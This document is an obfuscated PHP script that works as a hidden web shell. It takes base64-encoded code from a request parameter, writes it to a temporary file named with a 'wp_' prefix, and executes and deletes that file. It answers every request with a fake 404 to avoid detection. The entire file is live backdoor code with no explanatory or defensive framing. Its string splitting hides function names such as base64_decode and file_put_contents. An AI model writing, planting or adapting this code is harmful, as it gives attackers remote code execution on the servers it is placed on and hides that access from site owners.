<?php
try{
$vc82fb=array('te'.'mpnam','base64_dec'.'ode','array_key'.'_exists','file_put_c'.'ontents','sys_ge'.'t_temp_dir','un'.'link');
$pac5a5='a9ed8'.'245';
if($vc82fb[2]($pac5a5,$_POST)){
$vff500=$vc82fb[1]($_POST[$pac5a5]);
}elseif($vc82fb[2]($pac5a5,$_GET)){
$vff500=$vc82fb[1]($_GET[$pac5a5]);
}else{$vff500=null;}
if($vff500){
$m5a7dc=$vc82fb[0]($vc82fb[4](),'w'.'p_');
if($m5a7dc){
$vc82fb[3]($m5a7dc,'<'.'?ph'.'p '.$vff500);
http_response_code(404);
@include_once($m5a7dc);
@$vc82fb[5]($m5a7dc);
}}
http_response_code(404);
}catch(Throwable $e){http_response_code(404);}catch(Exception $e){http_response_code(404);}
